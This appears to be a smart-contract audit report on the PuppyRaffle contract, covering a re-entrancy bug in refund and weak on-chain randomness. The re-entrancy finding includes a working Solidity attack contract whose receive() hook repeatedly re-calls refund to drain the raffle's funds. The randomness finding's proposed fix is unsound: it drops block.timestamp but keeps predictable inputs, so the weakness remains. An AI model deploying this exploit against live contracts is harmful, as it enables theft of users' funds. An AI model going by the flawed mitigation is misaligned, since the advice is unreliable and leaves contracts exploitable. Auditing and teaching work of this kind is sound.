### S-1 Re-entrancy on refund

When `PuppyRaffle::refund` is called, eth is sent to player before the state accounting for the refund is updated. This allows for re-entrancy.

**Proof of Concept**

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //
    // Attacks
    //
    function test_srw_reentrancy_attack_can_pull_all_funds_via_refund()
        public
        playersEntered
    {
        ReentrancyAttack attack = new ReentrancyAttack(
            puppyRaffle,
            entranceFee
        );

        vm.deal(address(attack), entranceFee);

        attack.enterRaffle();
        assertEq(address(attack).balance, 0);

        attack.attack();

        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(attack).balance, entranceFee * 5);
    }
}

contract ReentrancyAttack {
    uint256 s_indexOfPlayer;
    PuppyRaffle s_puppyRaffle;
    uint256 s_entranceFee;
    uint256 s_reentrancy_count = 4;

    constructor(PuppyRaffle puppyRaffle, uint256 entranceFee) {
        s_puppyRaffle = puppyRaffle;
        s_entranceFee = entranceFee;
    }

    function enterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = address(this);

        s_puppyRaffle.enterRaffle{value: s_entranceFee}(players);
        s_indexOfPlayer = s_puppyRaffle.getActivePlayerIndex(address(this));
    }

    function attack() public {
        s_puppyRaffle.refund(s_indexOfPlayer);
    }

    receive() external payable {
        if (s_reentrancy_count > 0) {
            s_reentrancy_count -= 1;
            s_puppyRaffle.refund(s_indexOfPlayer);
        }
    }
}
```

**Mitigation**

```diff
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(
        playerAddress == msg.sender,
        "PuppyRaffle: Only the player can refund"
    );
    require(
        playerAddress != address(0),
        "PuppyRaffle: Player already refunded, or is not active"
    );

+   players[playerIndex] = address(0); // audit FOUND: reentrancy!!
    payable(msg.sender).sendValue(entranceFee);

-   players[playerIndex] = address(0); // audit FOUND: reentrancy!!
    emit RaffleRefunded(playerAddress);
}
```

### S-3 Weak RNG allows for miners to determine winner

Since RNG algorithm for `PuppyRaffle::selectWinner` relies on `block.timestamp`, a miner can quickly test the output of some transaction block orderings to attain a favourable result.


**Mitigation**

```diff
uint256 winnerIndex = uint256(
    keccak256(
-       abi.encodePacked(msg.sender, block.timestamp, block.difficulty)
+       abi.encodePacked(msg.sender, block.difficulty)
    )
) % players.length;
```
